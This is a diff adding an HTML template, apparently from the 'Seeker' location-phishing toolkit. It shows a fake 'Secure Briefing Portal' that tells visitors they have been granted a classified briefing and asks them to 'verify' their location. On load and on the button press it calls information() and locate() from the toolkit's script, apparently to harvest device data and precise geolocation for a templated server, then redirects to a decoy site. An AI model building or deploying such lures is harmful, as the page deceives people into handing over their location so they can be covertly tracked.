@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Briefing Portal</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+      background: #0d1117;
+      color: #c9d1d9;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 480px;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 32px;
+      background: #161b22;
+    }
+    .badge {
+      display: inline-block;
+      background: #1f6feb;
+      color: #fff;
+      font-size: 0.7rem;
+      padding: 2px 8px;
+      border-radius: 4px;
+      margin-bottom: 16px;
+      letter-spacing: 1px;
+    }
+    h1 { font-size: 1.4rem; font-weight: 600; margin-bottom: 8px; color: #f0f6fc; }
+    p { color: #8b949e; font-size: 0.9rem; line-height: 1.6; margin-bottom: 24px; }
+    .notice { background: #21262d; border-left: 3px solid #388bfd; padding: 12px; margin-bottom: 24px; font-size: 0.85rem; }
+    .btn {
+      display: inline-block;
+      padding: 12px 28px;
+      background: #238636;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .btn:hover { background: #2ea043; }
+    #status { margin-top: 16px; font-size: 0.85rem; color: #8b949e; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <span class="badge">SECURE CHANNEL</span>
+    <h1>Secure Briefing Portal</h1>
+    <p>You have been granted access to a classified briefing. Identity and location verification required before document delivery.</p>
+    <div class="notice">Location verification is required to ensure secure document transmission to authorized recipients only.</div>
+    <button id="verifyBtn" class="btn" onclick="handleVerify()">Verify &amp; Access</button>
+    <div id="status"></div>
+  </div>
+  <script>
+    window.SEEKER_API_BASE = '{{ api_base }}';
+  </script>
+  <script src="/static/seeker/js/location.js"></script>
+  <script>
+    information();
+    function handleVerify() {
+      var btn = document.getElementById('verifyBtn');
+      var status = document.getElementById('status');
+      btn.disabled = true;
+      btn.textContent = 'Verifying...';
+      var redirectUrl = '{{ redirect_url }}' || 'https://www.google.com';
+      locate(
+        function() {
+          status.textContent = 'Verification complete. Redirecting...';
+          window.location.href = redirectUrl;
+        },
+        function(err, msg) {
+          status.textContent = 'Verification failed. ' + (msg || 'Please enable location access.');
+          btn.disabled = false;
+          btn.textContent = 'Verify & Access';
+        }
+      );
+    }
+  </script>
+</body>
+</html>
